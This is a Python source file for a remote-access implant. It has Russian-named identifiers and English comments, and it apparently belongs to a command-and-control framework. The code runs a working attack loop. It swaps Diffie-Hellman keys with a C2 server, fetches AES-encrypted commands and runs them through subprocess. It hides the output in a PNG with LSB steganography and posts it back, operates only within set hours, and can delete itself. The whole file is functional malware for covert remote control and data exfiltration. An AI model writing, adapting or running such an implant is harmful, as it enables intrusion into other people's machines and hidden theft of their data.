from Crypto.Cipher import AES
from stegano import lsb
import uuid
import requests
import subprocess
import time as время
import sys
from datetime import datetime, time as dtime
import os
from diffiehellman import DiffieHellman

ЗЕЛЕНЫЙ = '\033[32m'
КРАСНЫЙ = '\033[31m'
СТАТУС = '\033[36m'
СБРОС = '\033[0m'

глобальный_ключ = None

ссылка = "http://localhost:80/" #remember to change this to the actual IP address of machine running the C2 Server.

маршруты = {
    0: ссылка + "feed.com", #task
    1: ссылка + "upload_photo.com", #upload
    2: ссылка + "login.com", #getkey
    3: ссылка + "auth.com" #sendkey
}

def проверить_интервал(): 
    текущее_время = datetime.now().hour
    if текущее_время >= 2 and текущее_время <= 10: 
        return True
    print(f"{КРАСНЫЙ}[!]{СБРОС} Nyet.")
    return False

def зашифровать(открытый_текст):  
    дополнение = 16 - (len(открытый_текст) % 16)
    шифр = AES.new(глобальный_ключ, AES.MODE_CBC)
    байты_текста = открытый_текст.encode() + (дополнение.to_bytes(1, "big") * дополнение)
    зашифрованное = шифр.encrypt(байты_текста)
    print(f"{СТАТУС}[*]{СБРОС} Encrypted Message")
    return (зашифрованное + шифр.iv).decode("latin-1")

def расшифровать(зашифрованный_текст): 
    зашифрованный_текст = зашифрованный_текст.encode("latin-1")
    инициализационный_вектор = зашифрованный_текст[-16:]
    шифр = AES.new(глобальный_ключ, AES.MODE_CBC, инициализационный_вектор)
    сообщение = зашифрованный_текст[:-16]
    открытый_текст = шифр.decrypt(сообщение)
    открытый_текст = открытый_текст[:-открытый_текст[len(открытый_текст)-1]]
    print(f"{СТАТУС}[*]{СБРОС} Command: {открытый_текст.decode()}")
    return открытый_текст.decode()

#str is the encrypted string of data that needs to be hidden in a file. 
def изменить_изображение(сообщение): #mod_img
    путь = "./images/"
    имя_файла = "safari-bird-1"
    закодированное_изображение = lsb.hide(f"{путь}{имя_файла}.png", сообщение)
    закодированное_изображение.save(f"{путь}{имя_файла}-final.png")
    return f"{путь}{имя_файла}-final.png"

#Execute command 
def выполнить(команда): #exec
    результат = ""
    if команда == "sleep 10":
        print(f"{СТАТУС}[*]{СБРОС} Sleeping...")
        время.sleep(10)
    else:
        список_команд = команда.split()
        if список_команд[0] == "destroy":
            уничтожить()
        elif список_команд[0] == "upload":
            print(f"[+] Reading {список_команд[1]}")
            pass
        else:
            print(f"{ЗЕЛЕНЫЙ}[+]{СБРОС} Executing command: %s" % команда)
            вывод = subprocess.run(список_команд, capture_output=True, text=True)
            результат = вывод.stdout
            print(f"{ЗЕЛЕНЫЙ}[+]{СБРОС} Result: %s" % результат)
    return результат

#Sending output back to C2Server 
def отправить_результат(обфусцированное_изображение): #send_output
    print(f"{ЗЕЛЕНЫЙ}[+]{СБРОС} Sending image back to server...")
    requests.post(маршруты[1], files={"file": open(обфусцированное_изображение, 'rb')})
    return

#Called to clean up and destroy implant
def уничтожить(): #destroy
    путь_импланта = os.path.abspath(__file__)
    subprocess.Popen(f"rm -f '{{file_path}}'", shell=True)
    sys.exit(0)

def распределить_ключ(): #key_dist
    global глобальный_ключ
    response = requests.get(маршруты[2])
    response = response.json()
    публичный_ключ_сервера = response["key"].encode("latin-1")

    dh = DiffieHellman(group=14, key_bits=540)
    мой_публичный_ключ = dh.get_public_key()
    объект_для_отправки = {"key": мой_публичный_ключ.decode("latin-1")}
    requests.post(маршруты[3], json=объект_для_отправки)

    глобальный_ключ = dh.generate_shared_key(публичный_ключ_сервера)[:16]
    print(f"{ЗЕЛЕНЫЙ}[+]{СБРОС} Derived AES key")
    return

#Setting up initial connection with C2 Server
def инициализация(): #init
    попытки = 0
    while попытки < 3:
        print(f"{ЗЕЛЕНЫЙ}[+]{СБРОС} Contacting Server...")
        try:
            ответ = requests.get(ссылка)
            print(f"{ЗЕЛЕНЫЙ}[+]{СБРОС} Connection Established...")
            print(ответ.text)
            распределить_ключ()
            return
        except Exception as e:
            print(f"{КРАСНЫЙ}[-]{СБРОС} Error in Contacting Server...")
            попытки += 1
    print(f"{КРАСНЫЙ}[-]{СБРОС} Failure in establishing connection.")
    уничтожить()
    exit(1)

#Gets task from GET request and executes 
def разобрать_json(ответ): #parse_json
    json_объект = ответ.json()
    команда = ""
    if json_объект["task"] == None:
        print(f"{КРАСНЫЙ}[-]{СБРОС} Error in parsing JSON.")
        команда = "echo 0"
    else:
        команда = json_объект["task"]
    return команда

if __name__ == '__main__': #main
    инициализация()

    количество_попыток = 1
    while True:
        if not проверить_интервал(): 
            время.sleep(60)
            continue
        try:
            ответ = requests.get(маршруты[0])
            зашифрованная_команда = разобрать_json(ответ)
            команда = расшифровать(зашифрованная_команда)
            результат = выполнить(команда)
            if результат != "":
                сообщение = зашифровать(результат)
                обфусцированное_изображение = изменить_изображение(сообщение)
                отправить_результат(обфусцированное_изображение)
            количество_попыток = 1
        except Exception as e:
            if количество_попыток > 3:
                print(f"{КРАСНЫЙ}[-]{СБРОС} Lost contact with server. Exiting...")
                break
            else:
                время.sleep(количество_попыток * 15)
                print(f"{КРАСНЫЙ}[-]{СБРОС} Could not contact server. Re-try #{количество_попыток}...")
                количество_попыток += 1
